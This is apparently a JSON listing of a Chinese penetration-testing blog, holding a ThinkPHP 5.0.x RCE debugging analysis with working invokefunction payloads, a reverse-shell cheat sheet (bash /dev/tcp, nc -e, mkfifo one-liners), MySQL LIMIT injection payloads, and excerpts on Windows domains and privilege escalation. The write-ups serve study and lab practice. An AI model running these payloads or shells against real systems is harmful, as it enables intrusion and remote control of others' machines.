{"total":14,"pageSize":10,"pageCount":2,"data":[{"title":"ThinkPHP系列——控制器过滤不严导致RCE调试及详细分析","slug":"thinkphp1","date":"2021-03-09T01:28:51.000Z","updated":"2021-03-09T06:23:22.966Z","comments":true,"path":"api/articles/thinkphp1.json","excerpt":"","keywords":null,"cover":"../static/images/image-20210309095347435.png","content":"<h1 id=\"前言\"><a class=\"markdownIt-Anchor\" href=\"#前言\"></a> 前言</h1>\n<p>ThinkPHP是许多中小型企业用于网站开发的国产cms，在2019年出现过多个RCE，本人此前没有过动态调试PHP代码的经验，在本文中记录配置和使用过程供大家学习参考。</p>\n<p>本文所有环境于ArchLinux系统搭建，其他系统配置方法大同小异。</p>\n<h1 id=\"配置nginx-php-73-phpstorm-xdebug-进行源码调试\"><a class=\"markdownIt-Anchor\" href=\"#配置nginx-php-73-phpstorm-xdebug-进行源码调试\"></a> 配置Nginx + PHP 7.3 + PHPStorm + Xdebug 进行源码调试</h1>\n<p>本章将介绍如何配置调试环境，如果已经具备该条件的请自行跳过。安装php 7.3环境（php 8.x以上弃用了getClass函数，复现过程会出问题）：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ALL_PROXY&#x3D;socks5:&#x2F;&#x2F;127.0.0.1:10808 yay -S php73 php73-fpm aur&#x2F;php73-xdebug #由于国内网络环境问题配置了代理</span><br></pre></td></tr></table></figure>\n<p>修改文件/etc/php73/conf.d/xdebug.ini （没有就建一个）：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">zend_extension&#x3D;&#x2F;lib&#x2F;php73&#x2F;modules&#x2F;xdebug.so</span><br><span class=\"line\">xdebug.remote_enable&#x3D;on</span><br><span class=\"line\">xdebug.remote_host&#x3D;127.0.0.1</span><br><span class=\"line\">xdebug.remote_port&#x3D;9000</span><br><span class=\"line\">xdebug.client_port&#x3D;9003</span><br><span class=\"line\">xdebug.remote_handler &#x3D; &quot;dbgp&quot;</span><br><span class=\"line\">xdebug.idekey &#x3D; PHPSTORM</span><br><span class=\"line\">xdebug.auto_trace&#x3D;1</span><br><span class=\"line\">xdebug.collect_params&#x3D;1</span><br><span class=\"line\">xdebug.collect_return&#x3D;1</span><br><span class=\"line\">xdebug.profiler_enable &#x3D; 1</span><br><span class=\"line\">xdebug.profiler_output_name &#x3D; &quot;cachegrind.out.%t.%p&quot;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>修改/etc/php73/php.ini，随便在开头加一行：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">xdebug.mode&#x3D;debug</span><br></pre></td></tr></table></figure>\n<p>修改/etc/php73/php-fpm.d/www.conf,添加一行：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">listen &#x3D; 127.0.0.1:9001 </span><br></pre></td></tr></table></figure>\n<p>修改/etc/nginx/nginx.conf中对应的部分：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">   location ~ \\.php$ &#123;</span><br><span class=\"line\">        try_files $uri &#x3D;404;</span><br><span class=\"line\"></span><br><span class=\"line\">        include fastcgi.conf;</span><br><span class=\"line\">        fastcgi_pass 127.0.0.1:9001;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>此<a href=\"http://www.thinkphp.cn/download/1260.html\">页面</a>下载thinkphp 5.2源码，然后解压至/usr/share/nginx/html，文件结构如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">share&#x2F;nginx&#x2F;html via 🐘 </span><br><span class=\"line\">❯ ls </span><br><span class=\"line\">application&#x2F;  build.php*  composer.json*  composer.lock*  extend&#x2F;  LICENSE.txt*  public&#x2F;  README.md*  runtime&#x2F;  test.php*  think*  thinkphp&#x2F;  tmp&#x2F;  vendor&#x2F;</span><br></pre></td></tr></table></figure>\n<p>重启nginx和php-fpm：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systemctl restart php73-fpm</span><br><span class=\"line\">systemctl restart nginx.service</span><br></pre></td></tr></table></figure>\n<p>能访问http://127.0.0.1/public/index.php说明nginx+php7.3配置的没问题：</p>\n<p><img src=\"../static/images/image-20210309095347435.png\" alt=\"image-20210309095347435\" /></p>\n<p>在根目录新建个test.php：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">phpinfo();</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>能看到xdebug说明xdebug没啥问题：</p>\n<p><img src=\"../static/images/image-20210309095521032.png\" alt=\"image-20210309095521032\" /></p>\n<p>PHPStorm需要加三个配置：</p>\n<p><img src=\"../static/images/image-20210309095603856.png\" alt=\"image-20210309095603856\" /></p>\n<p><img src=\"../static/images/image-20210309095626043.png\" alt=\"image-20210309095626043\" /></p>\n<p><img src=\"../static/images/image-20210309095639471.png\" alt=\"image-20210309095639471\" /></p>\n<p>依次点开：</p>\n<p><img src=\"../static/images/image-20210309095822596.png\" alt=\"image-20210309095822596\" /></p>\n<p>基本都是对的就没啥问题（9003那个不用管他，然后有其他报错根据提示改就是了，我累了）：</p>\n<p><img src=\"../static/images/image-20210309095900514.png\" alt=\"image-20210309095900514\" /></p>\n<p>然后这两个各开一下debug就行了：</p>\n<p><img src=\"../static/images/image-20210309095929909.png\" alt=\"image-20210309095929909\" /></p>\n<h1 id=\"未开启强制路由导致rce\"><a class=\"markdownIt-Anchor\" href=\"#未开启强制路由导致rce\"></a> 未开启强制路由导致rce</h1>\n<p>5.0.x payload：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?s&#x3D;index&#x2F;\\think\\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br><span class=\"line\">?s&#x3D;index&#x2F;think\\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;whoami</span><br></pre></td></tr></table></figure>\n<p>5.0.x与5.1.x payload不同，本章只分析5.0.22版本对应的源码。</p>\n<p>从<a href=\"https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815\">修复</a>看造成漏洞处：</p>\n<p><img src=\"../static/images/image-20210309104235268.png\" alt=\"image-20210309104235268\" /></p>\n<p>即/Index/think\\app/invokefunction中的think\\app部分，必须为：</p>\n<p>字母开头 且 到末尾必须都为数字字母，把&quot;\\“给过滤掉了，think\\app因为包含”\\&quot;，因此在后续版本中会报错。</p>\n<p>那么分析漏洞关键的部分就是怎么解析&quot;\\&quot;这里。</p>\n<p>在thinkphp-&gt;library-&gt;think-&gt;APP.php 第553行打断点：</p>\n<p><img src=\"../static/images/image-20210309101330291.png\" alt=\"image-20210309101330291\" /></p>\n<p>根据553，557行以及$result数组，我们可以知道index/think\\app/invokefunction分别可以指定：</p>\n<p>控制器 $controller 为 think\\app</p>\n<p>操作名 $actionName 为 invokefunction</p>\n<p>565行，根据$controller和$actionName，设置当前请求的操作器：</p>\n<p><img src=\"../static/images/image-20210309102136758.png\" alt=\"image-20210309102136758\" /></p>\n<p><img src=\"../static/images/image-20210309102153169.png\" alt=\"image-20210309102153169\" /></p>\n<p>前面都是设置一些参数的，571行这里跟一下Loader::controller，Loader.php的476行中有个getModuleAndClass函数：</p>\n<p><img src=\"../static/images/image-20210309112648259.png\" alt=\"image-20210309112648259\" /></p>\n<p>479行这里有个invokeClass：</p>\n<p><img src=\"../static/images/image-20210309113148298.png\" alt=\"image-20210309113148298\" /></p>\n<p>跟进去，发现其内容是一个反射类的过程，这里把我们指定的class，也就是think\\app指定的类，传给了$constructor：</p>\n<p><img src=\"../static/images/image-20210309113648190.png\" alt=\"image-20210309113648190\" /></p>\n<p>反射可参考<a href=\"https://www.php.net/manual/zh/class.reflectionclass.php\">官方手册</a>，最后返回到APP.php这里，$instance就变成了think\\app的实例化：</p>\n<p><img src=\"../static/images/image-20210309114205321.png\" alt=\"image-20210309114205321\" /></p>\n<p>一路跟到APP.php第606行，跟随invokeMethod函数，然后跟随bindParams函数：</p>\n<p><img src=\"../static/images/image-20210309114944995.png\" alt=\"image-20210309114944995\" /></p>\n<p>如果参数为空，那么就会根据路由来获取参数，其中会过滤一些特殊字符，注意一下：</p>\n<p><img src=\"../static/images/image-20210309115346300.png\" alt=\"image-20210309115346300\" /></p>\n<p>然后根据我们输入的参数名，值作为返回值，对应function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id：</p>\n<p><img src=\"../static/images/image-20210309115507308.png\" alt=\"image-20210309115507308\" /></p>\n<p>到InvokeArg这里：</p>\n<p><img src=\"../static/images/image-20210309120040834.png\" alt=\"image-20210309120040834\" /></p>\n<p>这里就会把system 和 参数作为输入继续调用，最后执行的结果会返回到Response中：</p>\n<p><img src=\"../static/images/image-20210309115903673.png\" alt=\"image-20210309115903673\" /></p>\n<p>流程总结：</p>\n<p>当thinkphp从uri的参数s中接受到</p>\n<p>Index/think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=or</p>\n<p>时，think\\app作为class，invokefunction作为reflect method被调用，</p>\n<p>而默认配置下，url_param_type = 0时，其将从参数中获取reflect method的参数</p>\n<p>system作为invokefunction函数invoke的函数，而vars[]数组为system函数的输入被调用，因此造成远程代码执行。</p>\n<p>修复后，thinkphp不允许使用带反斜杠的类来定义，限制了攻击者利用链路，因此修补了该问题。</p>\n<h1 id=\"reference\"><a class=\"markdownIt-Anchor\" href=\"#reference\"></a> Reference</h1>\n<p>[1] <a href=\"https://www.php.net/manual/zh/class.reflectionclass.php\">https://www.php.net/manual/zh/class.reflectionclass.php</a></p>\n<p>[2] <a href=\"http://www.thinkphp.cn/download/1260.html\">http://www.thinkphp.cn/download/1260.html</a></p>\n<p>[3] <a href=\"https://blog.csdn.net/KSalomo/article/details/106055536\">https://blog.csdn.net/KSalomo/article/details/106055536</a></p>\n<p>[4] <a href=\"https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815\">https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815</a></p>\n<p>[5] <a href=\"https://xz.aliyun.com/t/3570#toc-0\">https://xz.aliyun.com/t/3570#toc-0</a></p>\n<p>[6] <a href=\"https://xz.aliyun.com/t/7792#toc-0\">https://xz.aliyun.com/t/7792#toc-0</a></p>\n","text":" 前言ThinkPHP是许多中小型企业用于网站开发的国产cms，在2019年出现过多个RCE，本人此前没有过动态调试PHP代码的经验，在本文中记录配置和使用过程供大家学习参考。本文所有环境于ArchLinux系统搭建，其他系统配置方法大同小异。 配置Nginx + PHP 7.3","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"渗透 RCE","slug":"渗透-RCE","count":2,"path":"api/tags/渗透-RCE.json"}]},{"title":"Linux反弹shell小结","slug":"ReverseShell","date":"2021-03-07T14:19:20.000Z","updated":"2021-03-07T15:01:40.503Z","comments":true,"path":"api/articles/ReverseShell.json","excerpt":"","keywords":null,"cover":"../static/images/image-20210307223405682.png","content":"<h1 id=\"linux一切皆文件\"><a class=\"markdownIt-Anchor\" href=\"#linux一切皆文件\"></a> Linux一切皆文件</h1>\n<p>Linux文件描述符：linux跟踪打开文件后返回一个句柄，通过这个句柄可以实现读写操作。</p>\n<p>Linux启动时会默认打开三个文件描述符，分别为：</p>\n<ul>\n<li>标准输入 stdin\t\t0 （默认设备键盘）</li>\n<li>标准输出 stdout     1 （默认设备显示器）</li>\n<li>错误输出 stderr      2 （默认设备显示器）</li>\n</ul>\n<p>一条命令执行以前先会按照默认的情况进行绑定（也就是上面所说的 0,1,2），如果我们有时候需要让输出不显示在显示器上，而是输出到文件或者其他设备，那我们就需要重定向。</p>\n<ul>\n<li>输入重定向： &lt;&lt;</li>\n<li>输出重定向： &gt;&gt;</li>\n</ul>\n<p>还有就是&gt;&amp;这个符号的含义:</p>\n<ul>\n<li>当&gt;&amp;后面接文件时，表示将标准输出和标准错误输出重定向至文件。</li>\n<li>当&gt;&amp;后面接文件描述符时，表示将前面的文件描述符重定向至后面的文件描述符</li>\n</ul>\n<h1 id=\"linux反弹shell原理\"><a class=\"markdownIt-Anchor\" href=\"#linux反弹shell原理\"></a> Linux反弹shell原理</h1>\n<p>bash反弹shell命令：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bash -i &gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;192.168.5.3&#x2F;6666 0&gt;&amp;1</span><br></pre></td></tr></table></figure>\n<p>命令中，bash -i 产生一个交互式shell</p>\n<p>&gt;&amp;/dev/tcp/192.168.5.3/6666 建立tcp连接，将标准输出和错误输出重定向到socket套接字上。</p>\n<p>0&gt;&amp;1 将标准输入重定向到标准输出，也就是最终重定向到了tcp连接中</p>\n<h2 id=\"小实验\"><a class=\"markdownIt-Anchor\" href=\"#小实验\"></a> 小实验</h2>\n<p>我们去掉stdin的重定向，假设我们从主机A向主机B反弹shell：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bash -i &gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;192.168.5.3&#x2F;6666</span><br></pre></td></tr></table></figure>\n<p><img src=\"../static/images/image-20210307223405682.png\" alt=\"image-20210307223405682\" /></p>\n<p>输入只能在A主机的shell中输入，而所有输出都在B主机上才可以看到。（就是B主机不能写命令了）</p>\n<p>换个方向，只重定向stdin：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bash -i &lt; &#x2F;dev&#x2F;tcp&#x2F;192.168.5.3&#x2F;6666</span><br></pre></td></tr></table></figure>\n<p><img src=\"../static/images/image-20210307224319957.png\" alt=\"image-20210307224319957\" /></p>\n<p>那就只能B主机输入命令，A主机查看回显结果</p>\n<h1 id=\"常见反弹shell方法\"><a class=\"markdownIt-Anchor\" href=\"#常见反弹shell方法\"></a> 常见反弹shell方法</h1>\n<p>bash反弹shell</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bash -i&gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.146.129&#x2F;2333 0&gt;&amp;1</span><br><span class=\"line\">bash -i&gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.146.129&#x2F;2333 0&lt;&amp;1</span><br></pre></td></tr></table></figure>\n<p>exec绑定反弹</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">exec 5&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;192.168.146.129&#x2F;8000;cat &lt;&amp;5|while read line;do $line &gt;&amp;5 2&gt;&amp;1;done</span><br><span class=\"line\">0&lt;&amp;196;exec 196&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;192.168.146.129&#x2F;8000; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br></pre></td></tr></table></figure>\n<p>nc反弹shell</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -e &#x2F;bin&#x2F;sh 192.168.146.129 8000 </span><br><span class=\"line\">rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 192.168.146.129 2333 &gt;&#x2F;tmp&#x2F;f</span><br><span class=\"line\">mknod backpipe p; nc 192.168.146.129 2333 0&lt;backpipe | &#x2F;bin&#x2F;bash 1&gt;backpipe 2&gt;backpipe</span><br><span class=\"line\">nc 192.168.146.129 9000|&#x2F;bin&#x2F;bash|nc192.168.146.129 8000</span><br></pre></td></tr></table></figure>\n<h1 id=\"reference\"><a class=\"markdownIt-Anchor\" href=\"#reference\"></a> Reference</h1>\n<p><a href=\"https://www.cnblogs.com/-qing-/p/11247720.html\">https://www.cnblogs.com/-qing-/p/11247720.html</a></p>\n","text":" Linux一切皆文件Linux文件描述符：linux跟踪打开文件后返回一个句柄，通过这个句柄可以实现读写操作。Linux启动时会默认打开三个文件描述符，分别为：标准输入 stdin\t\t0 （默认设备键盘）标准输出 stdout     1 （默认设备显示器）错误输出 stder","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"渗透 RCE","slug":"渗透-RCE","count":2,"path":"api/tags/渗透-RCE.json"}]},{"title":"初探Windows域2——NTML协议和Kerberos协议基础","slug":"WindowsDomain_2","date":"2021-03-07T12:10:15.000Z","updated":"2021-03-07T14:20:17.830Z","comments":true,"path":"api/articles/WindowsDomain_2.json","excerpt":"<h1 id=\"active-directory\"><a class=\"markdownIt-Anchor\" href=\"#active-directory\"></a> Active Directory</h1>\n<p>Active Directory存储了有关网络对象的信息，并且让管理员和用 户能够轻松地查找和使用这些信息。Active Directory使用了一种 结构化的数据存储方式，并以此作为基础对目录信息进行合乎逻 辑的分层组织。</p>\n<p>网络对象分为:用户、用户组、计算机、域、组织单位以及安全策略等。</p>","keywords":null,"cover":"../static/images/image-20210307201435143.png","content":null,"text":" Active DirectoryActive Directory存储了有关网络对象的信息，并且让管理员和用 户能够轻松地查找和使用这些信息。Active Directory使用了一种 结构化的数据存储方式，并以此作为基础对目录信息进行合乎逻 辑的分层组织。网络对象分为:用户、用","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"渗透 Windows域","slug":"渗透-Windows域","count":2,"path":"api/tags/渗透-Windows域.json"}]},{"title":"初探Windows域1","slug":"WindowsDomain_1","date":"2021-03-07T07:22:18.000Z","updated":"2021-03-07T14:20:13.470Z","comments":true,"path":"api/articles/WindowsDomain_1.json","excerpt":"<h2 id=\"配置列表\"><a class=\"markdownIt-Anchor\" href=\"#配置列表\"></a> 配置列表</h2>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Windows 7 一台</span><br><span class=\"line\">Windows 2003 一台</span><br><span class=\"line\">Windows 2008 一台</span><br><span class=\"line\">Windows 2012 一台</span><br><span class=\"line\">Windows 2019 一台</span><br></pre></td></tr></table></figure>","keywords":null,"cover":"../static/images/image-20210307153341420.png","content":null,"text":" 配置列表1<br>2<br>3<br>4<br>5<br>Windows 7 一台<br>Windows 2003 一台<br>Windows 2008 一台<br>Windows 2012 一台<br>Windows 2019 一台<br> 域控主机配置本文使用Windows","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"渗透 Windows域","slug":"渗透-Windows域","count":2,"path":"api/tags/渗透-Windows域.json"}]},{"title":"提权总结","slug":"PrivilegeEscalation","date":"2021-03-05T07:22:18.000Z","updated":"2021-03-07T11:57:58.079Z","comments":true,"path":"api/articles/PrivilegeEscalation.json","excerpt":"<h1 id=\"linux\"><a class=\"markdownIt-Anchor\" href=\"#linux\"></a> Linux</h1>\n<p>常见的提权方法：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">suid提权</span><br><span class=\"line\">sudo提权     CVE-2021-3156     https:&#x2F;&#x2F;github.com&#x2F;blasty&#x2F;CVE-2021-3156</span><br><span class=\"line\">脏牛提权</span><br><span class=\"line\">NFS提权     </span><br></pre></td></tr></table></figure>","keywords":null,"cover":null,"content":null,"text":" Linux常见的提权方法：1<br>2<br>3<br>4<br>suid提权<br>sudo提权     CVE-2021-3156     https:&#x2F;&#x2F;github.com&#x2F;blasty&#x2F;CVE-2021-3156<br>脏牛提权","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"渗透","slug":"渗透","count":1,"path":"api/tags/渗透.json"}]},{"title":"mysql 注入相关总结","slug":"mysql_conclude","date":"2021-03-01T15:56:43.000Z","updated":"2021-03-02T01:47:21.545Z","comments":true,"path":"api/articles/mysql_conclude.json","excerpt":"","keywords":null,"cover":"../static/images/image-20210302000052954.png","content":"<h1 id=\"从注入到webshell\"><a class=\"markdownIt-Anchor\" href=\"#从注入到webshell\"></a> 从注入到webshell</h1>\n<h1 id=\"limit注入\"><a class=\"markdownIt-Anchor\" href=\"#limit注入\"></a> Limit注入</h1>\n<p>limit注入的限制还是挺多的。</p>\n<p>首先，limit注入只存在于mysql 5.6.6版本以下当中。</p>\n<p>mysql在执行查询语句时，可在后面接analyse语句，而在5.6.6版本之前，analyse语句可以使用函数：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select * from test LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),extractvalue(rand(),concat(0x3a,version())));</span><br><span class=\"line\">ERROR 1105 (HY000): XPATH syntax error: &#39;:5.5.62&#39;</span><br></pre></td></tr></table></figure>\n<p>5.6.6版本之后，mysql官方对analyse语句进行了改写，这里只能输入uint型的数据：</p>\n<p><img src=\"../static/images/image-20210302000052954.png\" alt=\"image-20210302000052954\" /></p>\n<p>因此5.6.6之后再利用这个特性会产生报错：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select * from site LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</span><br><span class=\"line\">ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;extractvalue(rand(),concat(0x3a,version())),1)&#39; at line 1</span><br></pre></td></tr></table></figure>\n<p>而即便再5.5.x版本，实测在5.5.41版本中可以使用时间盲注：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select * from test limit 0,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1);</span><br><span class=\"line\">ERROR 1105 (HY000): XPATH syntax error: &#39;:0&#39;</span><br></pre></td></tr></table></figure>\n<p>然而在5.5.62版本中，无法使用时间盲注：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select * from test LIMIT 1,1 procedure analyse(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1); </span><br><span class=\"line\">ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;),1)&#39; at line 1</span><br></pre></td></tr></table></figure>\n<p>但是报错注入都是可以用的。</p>\n<p>总结：</p>\n<p>在mysql 5.6.6版本之前，使用analyse函数时可以利用extractvalue函数进行报错注入，而在较低的版本中，还可以使用benchmark配合extractvalue在无回显下进行时间盲注，而在较高版本（至少5.5.62版本及之后），是不可以进行时间盲注的。</p>\n<h1 id=\"未完待续\"><a class=\"markdownIt-Anchor\" href=\"#未完待续\"></a> 未完待续……</h1>\n","text":" 从注入到webshell Limit注入limit注入的限制还是挺多的。首先，limit注入只存在于mysql 5.6.6版本以下当中。mysql在执行查询语句时，可在后面接analyse语句，而在5.6.6版本之前，analyse语句可以使用函数：1<br>2<br>mysq","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"web","slug":"web","count":5,"path":"api/tags/web.json"}]},{"title":"vulnstack2靶场通关笔记","slug":"vulnstack2","date":"2021-03-01T08:35:59.000Z","updated":"2021-03-01T10:09:01.245Z","comments":true,"path":"api/articles/vulnstack2.json","excerpt":"<h2 id=\"环境介绍\"><a class=\"markdownIt-Anchor\" href=\"#环境介绍\"></a> 环境介绍</h2>\n<p>​\t三个靶机，分别为：</p>\n<p>​\t\tDC 机： 内网ip 10.10.10.10 Windows 2012</p>\n<p>​\t\tWEB：   内网ip 10.10.10.80     外网ip 192.168.111.80      Windows 2008</p>\n<p>​\t\tPC：       内网ip 10.10.10.201  外网ip 192.168.111.201\tWindows7</p>","keywords":null,"cover":"../static/images/image-20210301170011107.png","content":null,"text":" 环境介绍​\t三个靶机，分别为：​\t\tDC 机： 内网ip 10.10.10.10 Windows 2012​\t\tWEB：   内网ip 10.10.10.80     外网ip 192.168.111.80      Windows 2008​\t\tPC：       内网ip ","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"web","slug":"web","count":5,"path":"api/tags/web.json"}]},{"title":"TODO（持续更新）","slug":"knowledge","date":"2021-02-28T07:08:03.000Z","updated":"2021-03-09T06:24:01.005Z","comments":true,"path":"api/articles/knowledge.json","excerpt":"","keywords":null,"cover":null,"content":"<p>同源策略总结</p>\n<p>​\tCORS</p>\n<p>​\tjsonp</p>\n<p>​\tcsrf</p>\n<p><a href=\"https://blog.b0ring.cf/#/posts/rce_conclude\">RCE总结</a><br />\n√ java<br />\n√ nodejs</p>\n<p>​\tgolang</p>\n<p>​\tphp</p>\n<p>sql注入</p>\n<p>​\t <a href=\"https://blog.b0ring.cf/#/posts/mysql_conclude\">mysql</a></p>\n<p>​\t\t√ limit 注入</p>\n<p>​\t\tgetshell 方法</p>\n<p>​\t\torder by 注入</p>\n<p>​\t\t文件读写函数</p>\n<p>​\t\tudf提权</p>\n<p>​\tsqlserver</p>\n<p>​\t\tgetshell 方法</p>\n<p>​\t\t文件读写方法</p>\n<p>​\t\t提权方法</p>\n<p>​\tOracle</p>\n<p>​\t\torder by注入</p>\n<p>内网渗透</p>\n<p>​\t免杀</p>\n<p>​\t域渗透</p>\n<p>​\t\t√ <a href=\"https://blog.b0ring.cf/#/posts/WindowsDomain_1\">域搭建</a></p>\n<p>​\t\t√ 域认证（<a href=\"https://blog.b0ring.cf/#/posts/WindowsDomain_2\">NTLM和Kerberos</a>，<a href=\"https://blog.b0ring.cf/#/posts/PrivilegeEscalation\">Windows Access Token</a>）</p>\n<p>​\t反弹shell</p>\n<p>​\t内网转发</p>\n<p>​\t√ <a href=\"https://blog.b0ring.cf/#/posts/PrivilegeEscalation\">权限提升</a></p>\n<p>​\t权限维持</p>\n<p><a href=\"https://blog.b0ring.cf/#/posts/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE\">redis</a><br />\n√ webshell<br />\n√ ssh公钥登录<br />\n√ 计划任务<br />\n√ 主从复制getshell</p>\n<p>其他web组件</p>\n<p>​\tslor</p>\n<p>​\tshiro</p>\n<p>​\tweblogic</p>\n<p>​\tStruts2</p>\n<p>开源cms分析</p>\n<p>​\tthinkphp</p>\n<p>ssrf</p>\n<p>​\t不同语言下的特点</p>\n<p>​\t绕过方法</p>\n<p>vulnstack靶机总结（1~7）<br />\n已完成：<a src=\"https://blog.b0ring.cf/#/posts/vulnstack2\">2</a></p>\n","text":"同源策略总结​\tCORS​\tjsonp​\tcsrfRCE总结<br />√ java<br />√ nodejs​\tgolang​\tphpsql注入​\t mysql​\t\t√ limit 注入​\t\tgetshell 方法​\t\torder by 